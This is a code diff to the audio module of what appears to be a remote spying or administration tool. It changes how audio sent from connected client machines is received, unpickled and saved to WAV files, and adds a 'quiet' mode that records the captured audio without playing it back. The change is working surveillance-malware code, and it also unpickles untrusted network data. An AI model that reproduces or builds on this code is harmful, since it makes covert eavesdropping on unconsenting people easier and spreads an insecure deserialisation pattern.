@@ -16,12 +16,12 @@ from domestic.global_state import *
 
 
 @internal_server_error_exception_handling
-def audio_action():
+def audio_action(write_stream):
   try:
     CHUNK = 81920
     FORMAT = pyaudio.paInt16
-    CHANNELS = 2
     RATE = 44100
+    channels = 2
     headersize = state['settings']['headersize']
     encryption = state['settings']['encryption']
     encoding = state['settings']['encoding']
@@ -31,9 +31,10 @@ def audio_action():
 
     p = pyaudio.PyAudio()
     try:
-      stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
     except:
-      stream = p.open(format=FORMAT, channels=1, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+      channels = 1
+      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
     record = state['options']['information-gathering']['record']['audio']
 
     client, addr = state['sockets']['modules']['audio'][0].accept()
@@ -60,7 +61,9 @@ def audio_action():
         frame = zlib.decompress(frame)
         frame = pickle.loads(frame)
 
-        stream.write(frame)
+        if write_stream is None:
+          stream.write(frame)
+
         frames.append(frame)
 
         real_msg = pickle.dumps(b' ')
@@ -74,7 +77,7 @@ def audio_action():
     write_error(err)
     try:
       if record:
-        make_wave(['modules', 'modules/audio'], client_obj[1], (CHANNELS, p, FORMAT, RATE, frames))
+        make_wave(['modules', 'modules/audio'], client_obj[1], (channels, p, FORMAT, RATE, frames))
 
       stream.stop_stream()
       stream.close()
@@ -91,6 +94,7 @@ def audio(data):
   ip = validate_dict_key(data, 'ip')
   port = validate_dict_key(data, 'port')
   run = validate_dict_key(data, 'run')
+  quiet = validate_dict_key(data, 'quiet')
   unbind = validate_dict_key(data, 'unbind')
   close = validate_dict_key(data, 'close')
   status = validate_dict_key(data, 'status')
@@ -103,9 +107,12 @@ def audio(data):
     else:
       data['ip'], data['port'] = state['sockets']['modules']['audio'][0].getsockname()
 
+    if quiet:
+      del data['quiet']
+      
     del data['run']
 
-    threading.Thread(target=audio_action, daemon=True).start()
+    threading.Thread(target=audio_action, args=(quiet,), daemon=True).start()
     session_message(data)
   elif ip and port:
     if state['sockets']['modules']['audio'][0] is None:
